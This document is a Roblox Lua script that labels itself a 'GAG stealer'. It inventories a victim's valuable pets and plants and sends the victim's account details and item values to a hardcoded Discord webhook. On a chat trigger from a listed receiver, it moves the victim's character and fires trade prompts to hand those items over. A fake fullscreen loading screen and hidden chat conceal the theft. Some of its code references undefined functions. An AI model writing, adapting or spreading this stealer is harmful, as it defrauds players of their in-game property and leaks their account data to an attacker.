_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- SETTINGS
local users = _G.Usernames or {"ezikiel53"}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"

-- SERVICES & MODULES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")

local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

local character = plr.Character or plr.CharacterAdded:Wait()

-- EXECUTOR NAME (only name)
local executorName = "Unknown"
if getexecutorname then
    pcall(function()
        executorName = tostring(getexecutorname())
    end)
end

-- SERVER HOP (replaces kicks)
local function serverHop()
    local PlaceID = game.PlaceId
    local ok, req = pcall(function()
        return request({
            Url = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100"
        })
    end)
    if not ok or not req or not req.Body then
        -- fallback teleport to same place (will rejoin random server)
        pcall(function() TeleportService:Teleport(PlaceID) end)
        return
    end

    local decoded = nil
    pcall(function() decoded = HttpService:JSONDecode(req.Body) end)
    if not decoded or not decoded.data then
        pcall(function() TeleportService:Teleport(PlaceID) end)
        return
    end

    for _, v in ipairs(decoded.data) do
        if v.playing < v.maxPlayers and v.id ~= game.JobId then
            pcall(function() TeleportService:TeleportToPlaceInstance(PlaceID, v.id) end)
            return
        end
    end

    pcall(function() TeleportService:Teleport(PlaceID) end)
end

-- Basic validation (serverHop instead of kick)
if next(users) == nil or webhook == "" then
    serverHop()
    return
end

if game.PlaceId ~= 126884695634066 then
    serverHop()
    return
end

if #Players:GetPlayers() >= 5 then
    serverHop()
    return
end

if pcall(function() return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() end) == "VIPServer" then
    serverHop()
    return
end

-- DATA + SETTINGS
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Headless horseman", "Elephant", "Spider", "Raccoon"}

local totalValue = 0
local itemsToSend = {}

-- HELPERS
local function calcPetValue(v14)
    local hatchedFrom = v14.PetData and v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end

    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end

    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end

    local weightRange = v17.GeneratedPetData and v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end

    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight and item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end
    return highestWeight
end

local function getHighestValueItem()
    local highest = 0
    for _, item in ipairs(itemsToSend) do
        if item.Value and item.Value > highest then
            highest = item.Value
        end
    end
    return highest
end

-- SCAN BACKPACK & BUILD itemsToSend
for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local success, petData = pcall(function()
                return dataService:GetData().PetsData.PetInventory.Data[petUUID]
            end)
            if not success or not petData then
                -- skip if no pet data
            else
                local itemName = petData.PetType
                local value = calcPetValue(petData)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName") or tool.Name
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

-- WEBHOOK SENDER (used by SendJoinMessage / SendMessage)
local function postWebhook(dataTable)
    local ok, res = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(dataTable)
        })
    end)
    return ok, res
end

local inventoryText, hasRareItems = BuildRareInventory()

-- SendJoinMessage: when announcing join (keeps teleport join command in content)
local function SendJoinMessage(list, prefix)
    local fields = {
        {
            name = "👤 Account Information",
            value = string.format("Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s",
                plr.Name,
                tostring(_G.Username),
                executorName,
                tostring(plr.AccountAge)
            ),
            inline = false
        },
        {
            name = "💰 Summary",
            value = string.format("Total Value: ¢%s\nHighest Value: ¢%s\nHighest weight fruit: %.2f KG",
                formatNumber(totalValue),
                formatNumber(getHighestValueItem()),
                getHighestKGFruit()
            ),
            inline = false
        },
        {
            name = "🎒 Inventory",
            value = InventoryText,
            inline = false
        },
        {
            name = "🔗 Join Link",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId,
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight or 0, formatNumber(item.Value))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "📥 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = { ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT" }
        }}
    }

    postWebhook(data)
end

-- SendMessage: on-chat trigger (sends summary of items and then proceed to steal)
local function SendMessage(sortedItems)
    local fields = {
        {
            name = "👤 Account Information",
            value = string.format("Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s",
                plr.Name,
                tostring(_G.Username),
                executorName,
                tostring(plr.AccountAge)
            ),
            inline = false
        },
        {
            name = "🎒 Items sent",
            value = "",
            inline = false
        },
        {
            name = "💰 Summary",
            value = string.format("Total Value: ¢%s\nHighest Value: ¢%s\nHighest weight fruit: %.2f KG",
                formatNumber(totalValue),
                formatNumber(getHighestValueItem()),
                getHighestKGFruit()
            ),
            inline = false
        },
        {
            name = "🔗 Join Link",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId,
            inline = false
        }
    }

    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight or 0, formatNumber(item.Value))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "📥 New GAG Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = { ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT" }
        }}
    }

    postWebhook(data)
end

-- doSteal: perform the actual stealing sequence (adapted, no kick — serverHop afterwards)
local function doSteal(player)
    -- move to victim
    local victimRoot = character:WaitForChild("HumanoidRootPart")
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
    wait(0.1)

    -- find prompts and fire
    local success, err = pcall(function()
        local promptRoot = player.Character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:FindFirstChild("ProximityPrompt")
                if promptHead then
                    repeat task.wait(0.01) until promptHead.Enabled
                    fireproximityprompt(promptHead)
                end
            else
                if promptRoot then
                    repeat task.wait(0.01) until promptRoot.Enabled
                    fireproximityprompt(promptRoot)
                end
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end
    end)

    -- wait until items are in backpack (or timeout)
    local itemsStillInBackpack = true
    local timeout = tick() + 10
    while itemsStillInBackpack and tick() < timeout do
        itemsStillInBackpack = false
        for _, item in ipairs(itemsToSend) do
            if backpack:FindFirstChild(item.Tool.Name) then
                itemsStillInBackpack = true
                break
            end
        end
        task.wait(0.1)
    end

    -- instead of kick, server hop away so it doesn't stay in same server
    serverHop()
end

-- waitForUserChat: listen for specified users; trigger SendMessage + doSteal
local function waitForUserChat()
    local sentMessage = false

    local function onPlayer(p)
        if table.find(users, p.Name) then
            p.Chatted:Connect(function()
                if not sentMessage then
                    -- prepare sorted items for message
                    local sentItems = {}
                    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
                    table.sort(sentItems, function(a, b)
                        if a.Type == "Pet" and b.Type ~= "Pet" then return true end
                        if a.Type ~= "Pet" and b.Type == "Pet" then return false end
                        return a.Value > b.Value
                    end)

                    SendMessage(sentItems)
                    sentMessage = true
                end

                -- call doSteal after message
                doSteal(p)
            end)
        end
    end

    for _, pp in ipairs(Players:GetPlayers()) do onPlayer(pp) end
    Players.PlayerAdded:Connect(function(pl) onPlayer(pl) end)
end

-- If we have items, send join message then wait for chat trigger steal
if #itemsToSend > 0 then
    -- create a sorted list for join message (highest value first)
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
    table.sort(sentItems, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    -- prefix for everyone ping if rare and ping enabled
    local hasRare = false
    for _, it in ipairs(itemsToSend) do
        if table.find(rarePets, it.Name) then hasRare = true break end
    end
    local prefix = ""
    if ping == "Yes" and hasRare then prefix = "--[[@everyone]] " end

    -- send join message (keeps teleport code in content like before)
    SendJoinMessage(sentItems, prefix)

    -- start listening for user chat to trigger the steal
    waitForUserChat()
end

-- FULLSCREEN LOADING UI (10 MINUTES)
local screen = Instance.new("ScreenGui")
screen.Name = "LoadingCover"
screen.IgnoreGuiInset = true
screen.ResetOnSpawn = false
screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
screen.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.ZIndex = 10000
frame.Parent = screen

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1,0,1,0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Loading… Please wait"
textLabel.TextColor3 = Color3.new(1,1,1)
textLabel.Font = Enum.Font.GothamBold
textLabel.TextSize = 45
textLabel.ZIndex = 10001
textLabel.Parent = frame

-- Hide chat safely
pcall(function()
    local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
    if RobloxGui then
        local Chat = RobloxGui:FindFirstChild("Chat")
        if Chat then Chat.Enabled = false end
    end
end)

frame.BackgroundTransparency = 1
pcall(function() TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0}):Play() end)

-- 10 minutes wait
task.wait(600)

pcall(function() TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play() end)
task.wait(1)
pcall(function() screen:Destroy() end)

-- Restore chat
pcall(function()
    local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
    if RobloxGui then
        local Chat = RobloxGui:FindFirstChild("Chat")
        if Chat then Chat.Enabled = true end
    end
end)
